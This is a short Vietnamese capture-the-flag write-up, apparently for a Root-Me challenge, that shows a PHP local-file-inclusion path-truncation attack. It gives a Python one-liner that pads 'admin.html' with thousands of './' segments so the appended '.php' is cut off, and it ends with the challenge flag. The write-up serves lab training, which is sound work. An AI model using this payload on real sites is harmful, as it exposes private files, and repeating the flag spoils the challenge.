![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/bbe3df29-dfa2-437b-8798-87547afe96dd)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/feae93cd-eade-4c40-b2f6-cf02d587cc15)

Nhiều khả năng source của web sẽ là
```
if(isset($_GET['page']) 
{     
    include($_GET['page'].".php");
}
```
Vì vậy nên admin.html.php => sẽ bị sai

Ở trang home ta thấy trên URL ```?page=home``` => đầu vào có thể nhập

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/904c15f2-a688-4760-a087-60f9fbaf1882)

<img width="658" alt="image" src="https://github.com/nguyenngocdung18/RootMe/assets/134156226/4b0c410d-c3ef-4066-b8b6-ae83bfbe36ff">

Ta sử dụng câu lệnh ```python -c "print('a/../admin.html/'+'./'*2048)"```
để in ra paylaod dùng để inject. Trong php thì ./ chỉ có mục đích làm cho PHP xử lý lại đường dẫn, nhưng vẫn trỏ vào cùng một đích đến.
Vì vậy ta sử dụng nó để overwrite biến page 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/e6485ee4-406e-4ce2-acf6-22d7ff4fdd6c)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/bc402773-4ece-4766-9faa-3f33cf6f7296)

=> 110V3TrUnC4T10n
